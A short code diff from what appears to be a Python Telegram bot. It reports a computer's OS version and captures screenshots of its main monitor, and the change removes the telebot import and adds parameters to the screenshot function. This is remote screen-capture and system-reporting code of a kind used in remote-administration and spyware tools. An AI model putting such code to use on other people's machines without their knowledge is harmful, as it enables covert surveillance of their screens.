@@ -1,5 +1,4 @@
 import os, requests, platform
-import telebot as tb
 import mss
 import mss.tools
 
@@ -19,7 +18,7 @@ def pc_info(message, user_id, bot):
                      + "\nOS version: " + os_version)
 
 
-def get_screenshot(message):
+def get_screenshot(message, user_id, bot):
     with mss.mss() as sct:
         monitor = sct.monitors[1]  # Use the 1st monitor
         im = sct.grab(monitor)  # Grab the picture
